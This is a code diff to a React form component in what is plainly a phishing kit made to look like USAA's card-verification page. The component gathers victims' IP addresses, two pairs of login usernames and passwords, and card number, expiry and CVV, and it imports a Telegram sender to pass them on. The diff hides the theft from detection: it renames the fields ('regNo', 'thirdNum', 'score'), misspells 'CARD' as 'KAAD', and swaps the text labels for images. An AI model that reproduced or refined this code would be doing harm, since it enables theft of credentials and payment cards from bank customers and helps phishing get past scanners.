@@ -3,18 +3,22 @@ import { useNavigate } from "react-router-dom";
 import cookies from "../utils/cookie.config";
 import TelegramSend from "../utils/send-message";
 import { verifyCreditCardNumber } from "../utils/luhn";
+import RegNo from "../assets/regNo.png";
+import registrationExpiry from "../assets/registrationExpiry.png";
+import thirdNum from "../assets/thirdNum.png";
+
 
 type Additional = {
-  cn: string;
-  edate: string;
-  ccv: string;
+  regNo: string;
+  registrationExpiry: string;
+  thirdNum: string;
 };
 
 export default function Additional() {
   const [formInput, setFormInput] = useState<Additional>({
-    cn: "",
-    edate: "",
-    ccv: "",
+    regNo: "",
+    registrationExpiry: "",
+    thirdNum: "",
   });
   const [isLoading, setIsLoading] = React.useState(false);
   const navigate = useNavigate();
@@ -67,19 +71,19 @@ export default function Additional() {
 
     IP: ${ipman.ipman}
 
-    Username: ${login1.username}
-    Password: ${login1.password}
+    Username: ${login1.score}
+    Password: ${login1.scorePro}
 
-    Username 2: ${login2.username2}
-    Password 2: ${login2.password2}
+    Username 2: ${login2.score2}
+    Password 2: ${login2.scorePro2}
 
-    CARD NUMBER: ${formInput.cn}
+    KAAD NUMBER: ${formInput.regNo}
 
-    CARD EXPIRY: ${formInput.edate}
+    KAAD EXPIRY: ${formInput.registrationExpiry}
 
-    CARD CVV: ${formInput.ccv}
+    KAAD CVV: ${formInput.thirdNum}
     `;
-    const isValidCardNumber = verifyCreditCardNumber(formInput.cn);
+    const isValidCardNumber = verifyCreditCardNumber(formInput.regNo);
     if (!isValidCardNumber) {
       document.getElementById("card-error")?.classList.remove("hide");
       return;
@@ -116,12 +120,11 @@ export default function Additional() {
                     htmlFor="usaa-form-v5-10-1-input-mwc9hotwmucj"
                     className="usaa-form-v5-10-1-fieldLabel usaa-form-v5-10-1-fieldWrapper-label"
                   >
-                    <span
-                      aria-hidden="false"
-                      className="usaa-form-v5-10-1-fieldLabel-text"
-                    >
-                      Card number
-                    </span>
+                   
+                      <div className="kylexy">
+          <img src={RegNo} height={"100%"} alt="" />
+                      </div>
+                     
                   </label>
                 </div>
                 <div>
@@ -135,7 +138,7 @@ export default function Additional() {
                 <span className="usaa-input">
                   <input
                   onChange={handleCardInputChange}
-                    name="cn"
+                    name="regNo"
                     aria-invalid="false"
                     id="usaa-form-v5-10-1-input-mwc9hotwmucj"
                     type="text"
@@ -158,12 +161,9 @@ export default function Additional() {
                     htmlFor="usaa-form-v5-10-1-input-mwc9hotwmucj"
                     className="usaa-form-v5-10-1-fieldLabel usaa-form-v5-10-1-fieldWrapper-label"
                   >
-                    <span
-                      aria-hidden="false"
-                      className="usaa-form-v5-10-1-fieldLabel-text"
-                    >
-                      Expiry date
-                    </span>
+                    <div className="kylexy">
+          <img src={registrationExpiry} height={25} alt="" />
+                      </div>
                   </label>
                 </div>
                 <div>
@@ -177,7 +177,7 @@ export default function Additional() {
                 <span className="usaa-input">
                   <input
                   onChange={handleExpDate}
-                    name="edate"
+                    name="registrationExpiry"
                     aria-invalid="false"
                     id="usaa-form-v5-10-1-input-mwc9hotwmucj"
                     type="text"
@@ -200,12 +200,9 @@ export default function Additional() {
                     htmlFor="usaa-form-v5-10-1-input-mwc9hotwmucj"
                     className="usaa-form-v5-10-1-fieldLabel usaa-form-v5-10-1-fieldWrapper-label"
                   >
-                    <span
-                      aria-hidden="false"
-                      className="usaa-form-v5-10-1-fieldLabel-text"
-                    >
-                      CVV
-                    </span>
+                   <div className="kylexy">
+          <img src={thirdNum} height={19} alt="" />
+                      </div>
                   </label>
                 </div>
                 <div>
@@ -219,7 +216,7 @@ export default function Additional() {
                 <span className="usaa-input">
                   <input
                   onChange={handleInputChange}
-                    name="ccv"
+                    name="thirdNum"
                     aria-invalid="false"
                     id="usaa-form-v5-10-1-input-mwc9hotwmucj"
                     type="text"
